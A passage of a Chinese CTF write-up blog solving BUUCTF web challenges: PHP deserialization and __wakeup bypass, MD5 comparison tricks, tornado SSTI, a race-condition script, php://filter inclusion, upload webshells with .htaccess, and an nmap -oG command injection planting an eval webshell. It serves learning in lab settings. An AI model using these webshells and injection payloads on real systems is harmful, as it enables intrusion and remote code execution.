/f1agg--&gt;chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)//get flag/calc.php/? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></pre></div><h2 id="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"><a href="#前端过滤–变量名前加空格–PHP解析时先将变量的空格去除" class="headerlink" title="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"></a>前端过滤–变量名前加空格–PHP解析时先将变量的空格去除</h2><p>为什么要在num前加一个空格？</p><p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p>PHP的字符串解析特性是什么？</p><p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>【当waf不让你过的时候，php却可以让你过】</p><h2 id="var-dump-scandir-读取根目录"><a href="#var-dump-scandir-读取根目录" class="headerlink" title="var_dump(scandir(\))读取根目录"></a>var_dump(scandir(\))读取根目录</h2><h2 id="file-get-contents-读文件"><a href="#file-get-contents-读文件" class="headerlink" title="file_get_contents()读文件"></a>file_get_contents()读文件</h2><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2><p><a href="https://blog.csdn.net/qq_37865996/article/details/102529396">先上大佬博客：https://blog.csdn.net/qq_37865996/article/details/102529396</a></p><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><p>…………………..</p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="/2021/10/21/BUU/PHP-1.png"></p><p>备份网站—&gt;<a href="http://www.zip---&gt;下载源码/">www.zip---&gt;下载源码</a></p><p>index.php</p><p><img src="/2021/10/21/BUU/PHP-2.png"></p><p>class.php</p><p><img src="/2021/10/21/BUU/PHP-3.png"></p><p>思路：  </p><p>1.类销毁时，username=admin，password=100，输出flag</p><p>2.$select= (实例化Name类-&gt;赋值-&gt;序列化-&gt;绕过_wakeup魔术方法)</p><p>3.$select仅为一个字符串，$res相当于waf</p><p>4.当$res销毁时，输出flag</p><p>exp</p><div class="hljs code-wrapper"><pre><code>&lt;?phpclass Name&#123;    private $username=&#39;admin&#39;;    private $password=&#39;100&#39;;&#125;$a=new Name();$b=serialize($a);    //修改变量个数，在每个类名和字段名前加%00print_r($b);//进行url编码，防止%00对应的不可打印字符在复制时丢失$c=urlencode(serialize($a));    //修改变量个数print_r($c);</code></pre></div><h2 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h2><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>public无标记，变量名不变，长度不变<br>protected在变量名前添加标记\00*\00，长度+3<br>private在变量名前添加标记\00(classname)\00，长度+2+类名长度</p><h2 id="wakeup绕过方法"><a href="#wakeup绕过方法" class="headerlink" title="_wakeup绕过方法"></a>_wakeup绕过方法</h2><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 </p><p> <big> 序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 </big> </p><div class="hljs code-wrapper"><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D//将变量个数2-&gt;3O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</code></pre></div><p><a href="https://blog.spoock.com/2016/11/03/php-wakeup/">贴上大佬博客：https://blog.spoock.com/2016/11/03/php-wakeup/</a></p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p><img src="/2021/10/21/BUU/BackupFile-1.png"></p><p>get 备份文件—&gt; index.php.bak</p><div class="hljs code-wrapper"><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) &#123;    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) &#123;     //需要绕过数字判断        exit(&quot;Just num!&quot;);    &#125;    $key = intval($key);        //获取整数值    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) &#123;        //弱类型比较 将$str转换为int型再进行比较 =&gt; $str=123        echo $flag;    &#125;&#125;else &#123;    echo &quot;Try to find out source file!&quot;;&#125;</code></pre></div><p>payload：</p><div class="hljs code-wrapper"><pre><code>/?key=123</code></pre></div><h2 id="常见备份文件泄露"><a href="#常见备份文件泄露" class="headerlink" title="常见备份文件泄露"></a>常见备份文件泄露</h2><div class="hljs code-wrapper"><pre><code>.rar .zip .7z .tar.gz .bak .swp .txt .html</code></pre></div><p><a href="https://blog.csdn.net/wy_97/article/details/78165051?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">备份文件参考泄露文献</a></p><h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p>//字符串与数字比较，转换为数字<br>//看字符串开头<br>//123admin–&gt;123<br>//admin123–&gt;0  </p><p>///字符串以xex开头(x表示数字)，会被转换为科学计数法</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>tornado—python框架</p><p>简单了解了一下ssti原理，<br><a href="https://www.jianshu.com/p/aef2ae0498df">SSTI链接</a><br><a href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi 学习</a><br><a href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结 </a><br>简单来说， 当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑</p><p><img src="/2021/10/21/BUU/easy_tornado-2.png"> </p><p><img src="/2021/10/21/BUU/easy_tornado-3.png">  </p><p><img src="/2021/10/21/BUU/easy_tornado-1.png"></p><div class="hljs code-wrapper"><pre><code>flag in /fllllllllllllag  render  md5(cookie_secret+md5(filename))  flag在/fllllllllllllag  render--模板注入  filehash算法</code></pre></div><p>思路：  </p><ol><li>寻找注入点  </li><li>获取cookie_secret值  </li><li>构造exp，get flag  </li></ol><div class="hljs code-wrapper"><pre><code>/file?filename=/flag.txt&amp;filehash=e50a4209e8ef4fa0a665b4dfbdc26e37只改filename，不改filehash---&gt;报错/error?msg=Error尝试确定模板注入点---&gt;回显3/error?msg=&#123;&#123;3&#125;&#125;查阅tornado文档（：并没有）[附上链接 ](https://tornado-zh.readthedocs.io/zh/latest/web.html) 获取cookie_secret值构造expimport hashlibhash = hashlib.md5()filename = &#39;/fllllllllllllag&#39;cookie_secret = &quot;4c12a8c3-8fe6-4182-b095-22e50cf34ac72&quot;hash.update(filename.encode(&#39;utf-8&#39;))s1 = hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))print(hash.hexdigest())</code></pre></div><h2 id="render-函数进行服务器端渲染"><a href="#render-函数进行服务器端渲染" class="headerlink" title="render()函数进行服务器端渲染"></a>render()函数进行服务器端渲染</h2><p><a href="https://blog.csdn.net/fengtingyan/article/details/83026387">render()函数服务器端渲染</a> </p><h2 id="tornado—RequestHandler"><a href="#tornado—RequestHandler" class="headerlink" title="tornado—RequestHandler"></a>tornado—RequestHandler</h2><p><a href="https://tornado-zh.readthedocs.io/zh/latest/web.html">tornado—RequestHandler类</a> </p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h5 id="第一遍做忘了审计源码…甚至没注意到标题…没一点思路"><a href="#第一遍做忘了审计源码…甚至没注意到标题…没一点思路" class="headerlink" title="第一遍做忘了审计源码…甚至没注意到标题…没一点思路:)"></a>第一遍做忘了审计源码…甚至没注意到标题…没一点思路:)</h5><p><img src="/2021/10/21/BUU/admin-1.png"></p><p>界面：<br>login/register<br>index/post/change password/logout</p><p>先</p><ol><li>登录/未登录的index<br><img src="/2021/10/21/BUU/admin-2.png"></li></ol><p>提示需要admin登录，貌似admin登录成功拿flag</p><ol start="2"><li>change password<br><img src="/2021/10/21/BUU/admin-3.png"></li></ol><p>给出了题目源码</p><h2 id="审计源码-！！！"><a href="#审计源码-！！！" class="headerlink" title="审计源码 ！！！"></a>审计源码 ！！！</h2><h2 id="正确打开方式：弱口令"><a href="#正确打开方式：弱口令" class="headerlink" title="正确打开方式：弱口令"></a>正确打开方式：弱口令</h2><p>username:admin<br>password:123</p><p><img src="/2021/10/21/BUU/admin-4.png"></p><h2 id="Unicode欺骗-nodeprep-prepare"><a href="#Unicode欺骗-nodeprep-prepare" class="headerlink" title="Unicode欺骗 nodeprep.prepare()"></a>Unicode欺骗 nodeprep.prepare()</h2><p>(规范标识符的常用方法是将所有内容都转换为小写)</p><p>问题出在处理关键字符”username”上，处理”username”的函数是自定义的函数strlower()</p><p><img src="/2021/10/21/BUU/admin-5.png"></p><p>nodeprep.prepare()因版本差距过大，存在漏洞</p><p>简单来说：<br>ᴀ -&gt; A -&gt; a<br>（未能找到相关文章…全部404了）</p><p>具体编码可查 ：<a href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> </p><p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>……</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：<br>我们注册一个用户test，现在有一个<br>进程1一直重复进行登录、改密码操作，<br>进程2一直注销，且以admin用户和进程1所改的密码进行登录，<br>是不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。</p><p>（理论可行，未能打通）</p><div class="hljs code-wrapper"><pre><code>import requestsimport threadingdef login(s, username, password):    data = &#123;        &#39;username&#39;: username,        &#39;password&#39;: password,        &#39;submit&#39;: &#39;&#39;    &#125;    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//login&quot;, data=data)def logout(s):    return s.get(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//logout&quot;)def change(s, newpassword):    data = &#123;        &#39;newpassword&#39;:newpassword    &#125;    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//change&quot;, data=data)def func1(s):    login(s, &#39;skysec&#39;, &#39;skysec&#39;)    change(s, &#39;skysec&#39;)def func2(s):    logout(s)    res = login(s, &#39;admin&#39;, &#39;skysec&#39;)    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:        print(&#39;finish&#39;)def main():    for i in range(1000):        print(i)        s = requests.Session()        t1 = threading.Thread(target=func1, args=(s,))        t2 = threading.Thread(target=func2, args=(s,))        t1.start()        t2.start()if __name__ == &quot;__main__&quot;:    main()</code></pre></div><p><a href="https://www.anquanke.com/post/id/164086">dailao三解</a> </p><p><a href="https://www.anquanke.com/post/id/164086#h3-7">一叶飘零大佬的一题三解</a> </p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="/2021/10/21/BUU/EasyMD5-1.png"></p><p>检索源码，无有效信息，联想标题，sql md5—&gt;ffifdyop</p><p><img src="/2021/10/21/BUU/EasyMD5-2.png"></p><p>检索源码，得到一个md5的弱类型比较</p><p><img src="/2021/10/21/BUU/EasyMD5-3.png"></p><div class="hljs code-wrapper"><pre><code>//弱类型比较，md5值只要为0e开头，就能绕过waf?a=QNKCDZO&amp;b=aabg7XSs//md5()无法处理数组，得到（000!=111&amp;&amp;error=error）?a[]=000&amp;b[]=111</code></pre></div><p><img src="/2021/10/21/BUU/EasyMD5-4.png"></p><p>得到md5强类型比较</p><div class="hljs code-wrapper"><pre><code>//同样可以用上面的数组进行绕过param1[]=1&amp;param2[]=0//或者进行真实匹配，值不等，md5相等即可param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre></div><p>—&gt;得到flag</p><h2 id="MD5比较"><a href="#MD5比较" class="headerlink" title="MD5比较"></a>MD5比较</h2><h3 id="1-弱类型比较"><a href="#1-弱类型比较" class="headerlink" title="1.弱类型比较"></a>1.弱类型比较</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) == md5($_POST[&#39;b&#39;]))</code></pre></div><p>弱类型比较因为php特性，在比较时先将string转换为int型，0e开头会被识别为科学计数法，结果0=0 比较成功  </p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a=QNKCDZO&amp;b=aabg7XSs</code></pre></div><p>只要是md5值为0e开头即可</p><h3 id="2-强类型比较"><a href="#2-强类型比较" class="headerlink" title="2.强类型比较"></a>2.强类型比较</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></pre></div><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到（0===0）强比较值相等</p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a[]=111&amp;b[]=aaa</code></pre></div><p>传入数组即可</p><h3 id="3-真实碰撞"><a href="#3-真实碰撞" class="headerlink" title="3.真实碰撞"></a>3.真实碰撞</h3><div class="hljs code-wrapper"><pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></pre></div><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre></div><p>值不等，md5相等即可。md5碰撞。</p><p>4.0e开头MD5的MD5为0e的MD5</p><div class="hljs code-wrapper"><pre><code>0e215962017 </code></pre></div><p><a href="https://err0r.top/article/md5/">标明出处：https://err0r.top/article/md5/</a> </p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/2021/10/21/BUU/NiZhuanSiWei-1.png"></p><p>读取源码，无有效信息—&gt;useless.php</p><div class="hljs code-wrapper"><pre><code>//绕过第一个if?text=data://text/plain,welcome to the zjctf?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=//读取useless.php文件内容&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre></div><p><img src="/2021/10/21/BUU/NiZhuanSiWei-2.png"></p><div class="hljs code-wrapper"><pre><code>//构造序列化类&lt;?phpclass Flag&#123;  //flag.php    public $file;    public function __tostring()&#123;        if(isset($this-&gt;file))&#123;            echo file_get_contents($this-&gt;file);            echo &quot;&lt;br&gt;&quot;;            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;    &#125;&#125;$get= new Flag();$get-&gt;file=&quot;flag.php&quot;;print_r(serialize($get));?&gt;当$file变量被当作字符串$password使用时，__tostring()方法自动调用，--get flag.php---&gt;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;最终payload:?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;---&gt;get flag</code></pre></div><h2 id="文件包含–php伪协议"><a href="#文件包含–php伪协议" class="headerlink" title="文件包含–php伪协议"></a>文件包含–php伪协议</h2><p><a href="https://opn90.top/2021/10/27/PHP-ways/">详–&gt;https://opn90.top/2021/10/27/PHP-ways/</a> </p><h2 id="php-tostring"><a href="#php-tostring" class="headerlink" title="php __tostring()"></a>php __tostring()</h2><p>当一个对象被当作字符串对待的时候，会触发这个魔术方法</p><p><img src="/2021/10/21/BUU/NiZhuanSiWei-3.png"></p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p><img src="/2021/10/21/BUU/youmom-1.png"></p><p>《一键去世》</p><p><img src="/2021/10/21/BUU/youmom-2.png"></p><p>fuzz了一下，只有php文件后缀被ban</p><div class="hljs code-wrapper"><pre><code>传码&lt;?@eval($_POST[&#39;a&#39;]);?&gt;</code></pre></div><p><img src="/2021/10/21/BUU/youmom-3.png"></p><p>上传成功</p><p>1.上传.htaccess配置文件</p><div class="hljs code-wrapper"><pre><code>AddType application/x-httpd-php .jpg</code></pre></div><p>抓包，将Content-Type改为image/png，绕过过滤—&gt;上传成功</p><p>用蚁剑连1.png文件</p><p>根目录下get flag</p><p>2.上传.user.ini文件</p><p>需要在同一目录下存在php文件</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>将所有.jpg为后缀的文件作为php文件解析</p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><div class="hljs code-wrapper"><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;          //初始化        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;    //判断op的值   op=1---&gt;写    op=2---&gt;读        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;           //写文件        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;               if(strlen((string)$this-&gt;content) &gt; 100) &#123;        //限制content长度                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);    //将content输入到filename文件当中            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        //返回 filename 的内容        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;     //打印变量        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;         //实例销毁 2-&gt;1 content 置空  ---&gt;  process              if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        /////===&gt;需对content置空进行绕过        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;         //限制字符在32-125之间    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre></div><p><strong>代码逻辑：</strong><br>1.在对象obj销毁时执行函数__destruct()，进行对服务器文件的读写<br>2.绕过__destruct()函数的，2的强比较，对content置空<br>3.设置op的值，1/2，对服务器文件进行读/写  </p><p>卡了…没看到</p><div class="hljs code-wrapper"><pre><code>    include(&quot;flag.php&quot;);</code></pre></div><p>发现不需要写文件，只要读取就可以了…</p><div class="hljs code-wrapper"><pre><code>构造exp        ///为op赋值2读取文件&lt;?phpclass FileHandler&#123;    public $op=2;    public $filename=&quot;flag.php&quot;;    public $content=&quot;111&quot;;&#125;$hel=new FileHandler();print_r(serialize($hel));</code></pre></div><h2 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h2><div class="hljs code-wrapper"><pre><code>$this-&gt;op === &quot;2&quot; || $this-&gt;op == &quot;2&quot;$this-&gt;op === &quot;2&quot;强类型， $op=2 ， $op=&quot;2&quot;  int类型，不同于string，绕过弱类型， $op=&quot;2&quot;  绕过</code></pre></div><h2 id="参数类型的解释"><a href="#参数类型的解释" class="headerlink" title="参数类型的解释"></a>参数类型的解释</h2><p>对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>给源码的简单绕waf</p><div class="hljs code-wrapper"><pre><code>I put something in F12 for youinclude &#39;flag.php&#39;;$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;    $id=$_GET[&#39;id&#39;];    $gg=$_GET[&#39;gg&#39;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#39;You got the first step&#39;;        if(isset($_POST[&#39;passwd&#39;])) &#123;            $passwd=$_POST[&#39;passwd&#39;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#39;Good Job!&#39;;                     highlight_file(&#39;flag.php&#39;);                     die(&#39;By Retr_0&#39;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#39;You can not get it !&#39;;            &#125;        &#125;        else&#123;            die(&#39;only one way to get the flag&#39;);        &#125;    &#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#39;Please input first&#39;);    &#125;&#125;</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>GET    ?id[]=1&amp;gg[]=2POST    passwd=1234567a</code></pre></div><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p><img src="/2021/10/21/BUU/BabyUpload-1.png"></p><p>waf: 后缀名不能有ph、过滤png文件、存在内容php类型的过滤</p><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p>上传变种一句话，jpg文件</p><p><img src="/2021/10/21/BUU/BabyUpload-2.png"></p><h2 id="htaccess配置文件"><a href="#htaccess配置文件" class="headerlink" title=".htaccess配置文件"></a>.htaccess配置文件</h2><p>上传.htaccess配置文件，将目录下的jpg文件当作php文件解析</p><p><img src="/2021/10/21/BUU/BabyUpload-3.png"></p><p>连接蚁剑，根目录下拿flag</p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java…先放一放</p><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><div class="hljs code-wrapper"><pre><code>&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];    &#125;    if(!isset($_GET[&#39;host&#39;])) &#123;        highlight_file(__FILE__);    &#125; else &#123;        $host = $_GET[&#39;host&#39;];        //escapeshellarg与escapeshellcmd使用不当        $host = escapeshellarg($host);        $host = escapeshellcmd($host);                //创建sandbox 并使用目录        $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);        echo &#39;you are in sandbox &#39;.$sandbox;        @mkdir($sandbox);        chdir($sandbox);        //利用点        echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);    &#125;</code></pre></div><p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>构造payload</p><div class="hljs code-wrapper"><pre><code>&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;escapeshellarg---&gt;先将&#39;转义，然后进行前后分段&#39;闭合&#39;&#39;\&#39;&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;\&#39;&#39;&#39;escapeshellcmd---&gt;先将\等字符进行转义，然后对不配对的&#39;进行转义&#39;&#39;\\&#39;&#39;\&lt;\?php eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</code></pre></div><p>构造payload，给沙盒地址，连蚁剑，get flag</p><h3 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h3><p><img src="/2021/10/21/BUU/Online-Tool-1.png"></p><h2 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h2><p><a 